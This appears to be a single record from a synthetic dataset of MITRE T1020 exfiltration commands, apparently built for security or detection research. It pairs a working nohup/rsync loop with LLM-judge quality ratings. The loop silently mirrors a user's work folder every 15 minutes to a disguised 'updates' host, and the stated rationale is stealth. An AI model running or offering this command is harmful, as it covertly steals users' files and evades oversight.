command: nohup bash -c 'while sleep 900; do rsync -azq --delete --exclude=\*.tmp --exclude=\*.cache $HOME/Work/ backup@updates.example.org:.local/.w/$HOSTNAME/; done' >/dev/null 2>&1 &
explanation: Automates periodic exfiltration every 15 minutes using rsync to continuously mirror a working directory to a remote host, fitting T1020’s automated data transfer pattern.
rationale_steps: Establish a loop to automate regular transfers.
Mirror contents with --delete to maintain a clean remote mirror.
Exclude noisy/temp files to reduce volume and detection.
Run with nohup and redirect all output to /dev/null for stealth.

llm_judgments.syntactic_justification: Balanced quoting with bash -c, valid while-loop and rsync flags with properly escaped globs, and correct nohup, redirections, and backgrounding.
llm_judgments.semantic_justification: Implements periodic (15-minute) automated mirroring of a local directory to a remote host via rsync with compression and deletion, matching T1020 automated exfiltration behavior.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper escaping of wildcards, valid nohup/backgrounding syntax, correct bash -c quoting, and valid rsync flags.
llm_judgments.semantic_justification: The command precisely implements T1020 automated exfiltration by using a persistent background loop with 15-minute intervals to continuously mirror a working directory to a remote host via rsync over SSH, with compression, quiet mode, deletion sync, and cache/temp file exclusions — all operationally realistic and aligned with the technique description.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct shell syntax for loops, backgrounding, redirection, and rsync flags.
llm_judgments.semantic_justification: The command precisely implements automated exfiltration by using a loop to periodically mirror a directory to a remote host via a common file transfer tool (rsync).
